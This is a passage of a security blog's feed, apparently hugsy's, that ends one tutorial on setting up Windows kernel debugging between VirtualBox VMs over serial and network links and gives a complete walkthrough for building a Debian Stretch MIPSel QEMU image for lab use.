class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;COMMAND&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;debugtype&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;serial&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, shutdown the VM and go to its settings on VirtualBox (&lt;strong&gt;Machine&lt;/strong&gt; -&amp;gt;
+&lt;strong&gt;Settings&lt;/strong&gt;) and in the "Serial Ports" tab, enable one port and bind it to
+&lt;code&gt;COM1&lt;/code&gt; (since we used the &lt;code&gt;debugport:1&lt;/code&gt; above with &lt;code&gt;bcdedit&lt;/code&gt;), and select &lt;code&gt;Host
+Pipe&lt;/code&gt; as Port Mode. Last provide a path to file in the &lt;code&gt;Path/Address&lt;/code&gt; field, for
+example &lt;code&gt;/tmp/win7-kd-pipe&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/win7-vbox-settings.png"&gt;&lt;/p&gt;
+&lt;p&gt;The tickbox &lt;code&gt;Connect to existing pipe/socket&lt;/code&gt; means that the debuggee will
+always have to be started &lt;strong&gt;after&lt;/strong&gt; the debugger VM, or VirtualBox will throw an
+error.&lt;/p&gt;
+&lt;h3&gt;Running the debugging session&lt;/h3&gt;
+&lt;h4&gt;On the debugger&lt;/h4&gt;
+&lt;p&gt;Start the debugger VM first and prepare WinDBG for kernel-mode debugging
+(Ctrl-K) by selecting COM as debug vector:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/win7-windbg-option.png"&gt;&lt;/p&gt;
+&lt;p&gt;WinDBG will then wait for communications on COM1.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;Microsoft&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Debugger&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;6.3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;9600.17298&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;X86&lt;/span&gt;
+&lt;span class="n"&gt;Copyright&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Microsoft&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Corporation&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;All&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rights&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;reserved&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
+
+&lt;span class="n"&gt;Opened&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;\\&lt;span class="o"&gt;.&lt;/span&gt;\&lt;span class="n"&gt;com1&lt;/span&gt;
+&lt;span class="n"&gt;Waiting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;reconnect&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
+
+&lt;span class="o"&gt;*************&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Symbol&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;validation&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;summary&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;**************&lt;/span&gt;
+&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="w"&gt;                         &lt;/span&gt;&lt;span class="n"&gt;Time&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ms&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;Location&lt;/span&gt;
+&lt;span class="n"&gt;Deferred&lt;/span&gt;&lt;span class="w"&gt;                                       &lt;/span&gt;&lt;span class="n"&gt;srv&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;\&lt;span class="n"&gt;syms&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;msdl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;microsoft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;download&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;On the debuggee&lt;/h4&gt;
+&lt;p&gt;Start the debuggee, and when the boot loader menu shows up, select the entry
+named &lt;code&gt;Windows 7 with kernel debug via COM&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/win7-boot-manager.png"&gt;&lt;/p&gt;
+&lt;p&gt;As you see Windows already indicates that this entry will be in debug mode. And
+when you press Enter, the debugger VM will be attached to the debuggee.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/win7-debug-session.png"&gt;&lt;/p&gt;
+&lt;p&gt;You're now debugging the Windows 7 x86 VM kernel!! But as you'll see, Serial
+Port debugging will drastically slow down all operations on the debuggee. This
+is why projects like VirtualKD came to life, but personnally, if the target VM
+is a Windows 8+, my favorite kernel debugging method is Network based, as
+detailed below.&lt;/p&gt;
+&lt;h2&gt;Setup Network kernel debugging for the Windows 8+ target&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: All is described
+&lt;a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-a-network-debugging-connection"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;IMHO, this method is the best and fastest method to debug Windows kernel, but it
+has 2 constraints:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;you must use a compatible network adapter (not so much a problem for
+    VirtualBox or VMware)&lt;/li&gt;
+&lt;li&gt;the debuggee &lt;strong&gt;must&lt;/strong&gt; be running Windows 8 or later.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;When preparing the VM, make sure to add an extra Network Card as Host-Only, and
+linked to the same interface as the one specified on the host
+(i.e. &lt;code&gt;vboxnet0&lt;/code&gt;). &lt;strong&gt;Important note&lt;/strong&gt;: in the "Advanced" section, select one of
+the Intel Pro card (preferably PRO/1000 MT Desktop). The reason for that is that
+&lt;a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/supported-ethernet-nics-for-network-kernel-debugging-in-windows-8-1"&gt;Windows network kernel debugging does not work with all network controllers&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Boot the VM, and then open the "Device Manager" (Control Panel -&amp;gt;
+System -&amp;gt; Advanced system settings -&amp;gt; on the Hardware tab). Expand "Network
+adapters" and select the 2nd device's properties menu. On the new window, the
+"Location" field will be required to assignate this interface for debugging:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/win8-network-controller-properties.png"&gt;&lt;/p&gt;
+&lt;p&gt;This indicates us the bus parameters we will need to provide &lt;code&gt;bcdedit&lt;/code&gt; later on,
+with the format &lt;code&gt;&amp;lt;BusNumber&amp;gt;:&amp;lt;DeviceNumber&amp;gt;:&amp;lt;FunctionNumber&amp;gt;&lt;/code&gt; (in this case
+&lt;code&gt;0.8.0&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;Now open an administrator prompt and use &lt;code&gt;bcdedit&lt;/code&gt; utility to create a
+new entry to the boot manager like we did on Windows 7, and enable the debug
+mode for it. But unlike Windows 7, now we have to setup the network properties:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\&amp;gt; bcdedit /dbgsettings net hostip:ip.of.debugger.vm port:50000 key:Kernel.Debugging.Is.Fun
+C:\&amp;gt; bcdedit /set {dbgsettings} busparams &amp;lt;BusNumber&amp;gt;.&amp;lt;DeviceNumber&amp;gt;.&amp;lt;FunctionNumber&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/win8-setup-kernel-mode.png"&gt;&lt;/p&gt;
+&lt;h3&gt;Running the debugging session&lt;/h3&gt;
+&lt;h4&gt;On the debugger&lt;/h4&gt;
+&lt;p&gt;Start the debugger VM first and prepare WinDBG for kernel-mode debugging
+(Ctrl-K) by selecting NET as debug vector, and set the Port and Key adequately.
+WinDBG will then be waiting for new connection:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;Microsoft&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;R&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;Windows&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;Debugger&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;Version&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;.&lt;span class="mi"&gt;3&lt;/span&gt;.&lt;span class="mi"&gt;9600&lt;/span&gt;.&lt;span class="mi"&gt;17336&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;AMD64&lt;/span&gt;
+&lt;span class="nv"&gt;Copyright&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;c&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;Microsoft&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;Corporation&lt;/span&gt;.&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;All&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;rights&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;reserved&lt;/span&gt;.
+
+&lt;span class="nv"&gt;Using&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;NET&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;debugging&lt;/span&gt;
+&lt;span class="nv"&gt;Opened&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;WinSock&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;.&lt;span class="mi"&gt;0&lt;/span&gt;
+&lt;span class="nv"&gt;Waiting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;reconnect&lt;/span&gt;...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;On the debuggee&lt;/h4&gt;
+&lt;p&gt;Start the VM. When the boot loader menu shows up, select the one with the
+network kernel mode enabled&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/win8-boot-loader.png"&gt;&lt;/p&gt;
+&lt;p&gt;The debugger will show some activity immediately. Note that execution of the
+debuggee will not stop, so you may hit Ctrl-Break at any time to force an
+interruption:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/win8-success.png"&gt;&lt;/p&gt;
+&lt;p&gt;In this post, we've presented 2 techniques for kernel debugging, depending on
+the Windows version targeted. Some other techniques exist (FireWire, USB
+debugging) but they are slightly harder to put in place.&lt;/p&gt;
+&lt;p&gt;The next post will cover more of Windows kernel exploitation 101 by going
+through some vulnerabilities on
+the
+&lt;a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver"&gt;HEVD driver&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Cheers ✌&lt;/p&gt;</content><category term="tutorial"></category><category term="windows"></category><category term="kernel"></category><category term="debug"></category><category term="virtualbox"></category></entry><entry><title>Building a Debian Stretch QEMU image for MIPSel</title><link href="https://blahcat.github.io/posts/2017/07/14/building-a-debian-stretch-qemu-image-for-mipsel.html" rel="alternate"></link><published>2017-07-14T00:00:00-07:00</published><updated>2017-07-14T00:00:00-07:00</updated><author><name>hugsy</name></author><id>tag:blahcat.github.io,2017-07-14:/posts/2017/07/14/building-a-debian-stretch-qemu-image-for-mipsel.html</id><summary type="html">&lt;h2&gt;Building a Debian Stretch (9) QEMU image running MIPSel&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;
+Two new images, Debian Stretch on MIPSel and MIPS64el were added to
+&lt;a href="https://mega.nz/#F!oMoVzQaJ!iS73iiQQ3t_6HuE-XpnyaA"&gt;my QEMU image repo&lt;/a&gt;
+The rest of this post explains how I built them.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3&gt;Introduction&lt;/h3&gt;
+&lt;p&gt;After releasing &lt;a href="/posts/2017/06/25/qemu-images-to-play-with.html"&gt;the QEMU images&lt;/a&gt; I've created to test &lt;a href="https://github.com/hugsy/gef"&gt;&lt;code&gt;GEF&lt;/code&gt;&lt;/a&gt;, I've received …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Building a Debian Stretch (9) QEMU image running MIPSel&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;
+Two new images, Debian Stretch on MIPSel and MIPS64el were added to
+&lt;a href="https://mega.nz/#F!oMoVzQaJ!iS73iiQQ3t_6HuE-XpnyaA"&gt;my QEMU image repo&lt;/a&gt;
+The rest of this post explains how I built them.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3&gt;Introduction&lt;/h3&gt;
+&lt;p&gt;After releasing &lt;a href="/posts/2017/06/25/qemu-images-to-play-with.html"&gt;the QEMU images&lt;/a&gt; I've created to test &lt;a href="https://github.com/hugsy/gef"&gt;&lt;code&gt;GEF&lt;/code&gt;&lt;/a&gt;, I've received tons of demands from people asking for more images, but also for some DYI procedures.&lt;/p&gt;
+&lt;p&gt;As  &lt;a class="fa fa-twitter" href="https://twitter.com/Fox0x01" target="_blank"&gt;@Fox0x01&lt;/a&gt; already covered fairly exhaustively [how to build an QEMU ARMv6 compatible VM][https://azeria-labs.com/emulate-raspberry-pi-with-qemu/){:target="_blank"}, through this blog post I intend to provide a step-by-step how-to on building a Debian Stretch Malta MIPS32el image.&lt;/p&gt;
+&lt;div class="alert-info"&gt;&lt;i class="fa fa-info-circle"&gt;&amp;nbsp;Note:&lt;/i&gt;&lt;br&gt;
+There is no miracle here, I've just spend a long time googling for solution every time I was facing a problem. This tuto is more for a being a personal reminder for the future times I need to build an image 😊
+&lt;/div&gt;
+&lt;h3&gt;Pre-requisites&lt;/h3&gt;
+&lt;p&gt;For the Debian MIPS net installer, the &lt;code&gt;initrd&lt;/code&gt; &lt;strong&gt;is&lt;/strong&gt; the installation
+device. No need to download any ISO or such, simply download:
+- the initrd (the distro installer):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;wget&lt;span class="w"&gt; &lt;/span&gt;http://ftp.debian.org/debian/dists/Debian9.13/main/installer-mipsel/current/images/malta/netboot/initrd.gz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+&lt;li&gt;a kernel to boot on:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;wget&lt;span class="w"&gt; &lt;/span&gt;http://ftp.debian.org/debian/dists/Debian9.13/main/installer-mipsel/current/images/malta/netboot/vmlinux-4.9.0-13-4kc-malta
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;You also need a hard drive to install the OS on:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;qemu-img&lt;span class="w"&gt; &lt;/span&gt;create&lt;span class="w"&gt; &lt;/span&gt;-f&lt;span class="w"&gt; &lt;/span&gt;qcow2&lt;span class="w"&gt; &lt;/span&gt;disk.qcow2&lt;span class="w"&gt; &lt;/span&gt;20G
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Since we're using the Debian net installer, we will need an Internet connection. Also don't be surprised to see your CPU activity jump up and your fans get louder!&lt;/p&gt;
+&lt;h2&gt;Installing Debian&lt;/h2&gt;
+&lt;p&gt;Start the installation with:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;qemu-system-mipsel&lt;span class="w"&gt; &lt;/span&gt;-M&lt;span class="w"&gt; &lt;/span&gt;malta&lt;span class="w"&gt; &lt;/span&gt;-m&lt;span class="w"&gt; &lt;/span&gt;1G&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;-hda&lt;span class="w"&gt; &lt;/span&gt;./disk.qcow2&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;-initrd&lt;span class="w"&gt; &lt;/span&gt;./initrd.gz&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;-kernel&lt;span class="w"&gt; &lt;/span&gt;./vmlinux-4.9.0-4-4kc-malta&lt;span class="w"&gt; &lt;/span&gt;-append&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;nokaslr&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;-nographic
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The kernel boot option &lt;code&gt;nokaslr&lt;/code&gt; is required or you'll get an error when the
+kernel will try to decompress &lt;code&gt;initrd&lt;/code&gt;. The reason is:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[...] that QEMU loads the initrd into the memory
+immediately after the kernel, but that bit of memory might get
+overwritten by KASLR when the kernel starts and relocates itself.
+You can workaround it by passing "-append nokaslr" to QEMU, [...]&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;a href="https://www.mail-archive.com/debian-bugs-dist@lists.debian.org/msg1525239.html"&gt;Source&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Then your MIPSel (Malta-flavor) system boots, and you end up in the regular
+&lt;code&gt;ncurses&lt;/code&gt; Debian installer.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="1.debian.installer.png&amp;quot;%" src="https://i.imgur.com/IqDge4n.png"&gt;&lt;/p&gt;
+&lt;p&gt;Let the installer do its magic.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="3.debian.partition.png" src="https://i.imgur.com/Lg6Db5x.png"&gt;&lt;/p&gt;
+&lt;p&gt;Since it's a VM for test and lab stuff, the guided partitioning is more than
+enough (and select &lt;code&gt;All files in one partition&lt;/code&gt;). Feel free to tweak that part.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="2.debian.installation.png" src="https://i.imgur.com/iv31UxH.png"&gt;&lt;/p&gt;
+&lt;p&gt;I usually install only the minimum OS to get a running shell once I boot. For
+there I install everything from &lt;code&gt;apt-get&lt;/code&gt;. With a proper &lt;code&gt;openssh-server&lt;/code&gt;
+installed, I then create 2 scripts:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;start.sh&lt;/code&gt; with all the good QEMU parameters, to launch the VM in
+    non-graphic mode, and set up the port forward on tcp/22&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ssh.sh&lt;/code&gt; to connect to the VM.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Debian will detect no boot loader, and show the following warning:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="7.debian.end_installer.png" src="https://i.imgur.com/fuxZCDU.png"&gt;&lt;/p&gt;
+&lt;p&gt;So remember to append &lt;code&gt;root=/dev/sda1&lt;/code&gt; to &lt;code&gt;-append&lt;/code&gt; option before running your
+Qemu.&lt;/p&gt;
+&lt;p&gt;Then the installation will finish successfully:
+&lt;img alt="6.debian.complete.png" src="http://i.imgur.com/qFvh3cM.png"&gt;&lt;/p&gt;
+&lt;h3&gt;Fixing the last quirks&lt;/h3&gt;
+&lt;p&gt;If you try to boot directly the VM by simply removing the &lt;code&gt;-initrd&lt;/code&gt; line, the
+kernel will panic like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;end&lt;span class="w"&gt; &lt;/span&gt;Kernel&lt;span class="w"&gt; &lt;/span&gt;panic&lt;span class="w"&gt; &lt;/span&gt;-&lt;span class="w"&gt; &lt;/span&gt;not&lt;span class="w"&gt; &lt;/span&gt;syncing:&lt;span class="w"&gt; &lt;/span&gt;VFS:&lt;span class="w"&gt; &lt;/span&gt;Unable&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;mount&lt;span class="w"&gt; &lt;/span&gt;root&lt;span class="w"&gt; &lt;/span&gt;fs&lt;span class="w"&gt; &lt;/span&gt;on&lt;span class="w"&gt; &lt;/span&gt;unknown-block&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;,0&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We must extract the &lt;code&gt;initrd&lt;/code&gt; image from the installation: to do so you must
+mounting the QEMU disk via the
+&lt;a href="https://en.wikipedia.org/wiki/Network_block_device"&gt;Network Block Device&lt;/a&gt;
+kernel module &lt;code&gt;nbd&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;apt&lt;span class="w"&gt; &lt;/span&gt;install&lt;span class="w"&gt; &lt;/span&gt;nbd-client
+$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;modprobe&lt;span class="w"&gt; &lt;/span&gt;nbd&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;max_part&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;
+$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;qemu-nbd&lt;span class="w"&gt; &lt;/span&gt;--connect&lt;span class="o"&gt;=&lt;/span&gt;/dev/nbd0&lt;span class="w"&gt; &lt;/span&gt;disk.qcow2
+$&lt;span class="w"&gt; &lt;/span&gt;mkdir&lt;span class="w"&gt; &lt;/span&gt;mnt
+$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;mount&lt;span class="w"&gt; &lt;/span&gt;/dev/nbd0p1&lt;span class="w"&gt; &lt;/span&gt;mnt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Extract the initramfs file (&lt;code&gt;initrd.img&lt;/code&gt;) from &lt;code&gt;MOUNT_PATH/boot/&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;cp&lt;span class="w"&gt; &lt;/span&gt;mnt/boot/initrd.img-4.9.0-4-4kc-malta&lt;span class="w"&gt; &lt;/span&gt;.&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;sync
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And unmount the NBD device.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;umount&lt;span class="w"&gt; &lt;/span&gt;/dev/nbd0p1
+$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;nbd-client&lt;span class="w"&gt; &lt;/span&gt;-d&lt;span class="w"&gt; &lt;/span&gt;/dev/nbd0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;You can now boot the VM with the following command:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;qemu-system-mipsel&lt;span class="w"&gt; &lt;/span&gt;-M&lt;span class="w"&gt; &lt;/span&gt;malta&lt;span class="w"&gt; &lt;/span&gt;-m&lt;span class="w"&gt; &lt;/span&gt;1G&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;-hda&lt;span class="w"&gt; &lt;/span&gt;./disk.qcow2&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;-initrd&lt;span class="w"&gt; &lt;/span&gt;./initrd.img-4.9.0-4-4kc-malta&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;-kernel&lt;span class="w"&gt; &lt;/span&gt;./vmlinux-4.9.0-4-4kc-malta&lt;span class="w"&gt; &lt;/span&gt;-append&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;nokaslr root=/dev/sda1&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;-nographic
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="9.first.boot.png" src="http://i.imgur.com/6h0Wxed.png"&gt;&lt;/p&gt;
+&lt;p&gt;On all the images I've created, Debian doesn't properly DHCP the Ethernet
+interface (get a wrong name for the interface), so it must be done manually at
+the first boot (use &lt;code&gt;ip -a&lt;/code&gt; to show the interface name):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# cat &amp;gt; /etc/network/interfaces &amp;lt;&amp;lt; EOF&lt;/span&gt;
+auto&lt;span class="w"&gt; &lt;/span&gt;lo
+iface&lt;span class="w"&gt; &lt;/span&gt;lo&lt;span class="w"&gt; &lt;/span&gt;inet&lt;span class="w"&gt; &lt;/span&gt;loopback
+iface&lt;span class="w"&gt; &lt;/span&gt;enp0s18&lt;span class="w"&gt; &lt;/span&gt;inet&lt;span class="w"&gt; &lt;/span&gt;dhcp
+EOF
